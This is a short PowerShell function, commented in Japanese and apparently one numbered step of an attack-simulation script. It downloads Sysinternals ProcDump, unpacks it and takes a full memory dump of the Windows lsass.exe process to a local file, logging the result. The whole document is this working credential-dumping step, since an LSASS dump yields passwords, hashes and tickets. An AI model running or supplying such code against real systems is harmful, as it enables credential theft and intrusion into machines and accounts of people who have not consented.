# プロセス lsass.exe のプロセスダンプの取得

function act5 {
    param (
        [Parameter( Mandatory=$true)]
        [string]$responseFilePath
    )
    
    Write-Output "" >$responseFilePath
    
    # ProcDumpのURL
    $procdumpUrl = "https://download.sysinternals.com/files/Procdump.zip"

    # ダウンロード先のパス
    $destination = "Procdump.zip"

    # ProcDumpをダウンロード
    Invoke-WebRequest -Uri $procdumpUrl -OutFile $destination

    # ZIPファイルを展開
    Expand-Archive -LiteralPath $destination -DestinationPath "."

    # ダンプを取得したいプロセスの名前
    $processName = "lsass.exe"

    # ダンプファイルの保存先
    $dumpFile = "dumpfile.dmp"

    # メモリダンプの取得
    try {
        .\procdump.exe -accepteula -ma $processName $dumpFile | Tee-Object -FilePath $responseFilePath -Append
    } catch {
        Write-Output "Error: $_" | Tee-Object -FilePath $responseFilePath -Append
    }
}
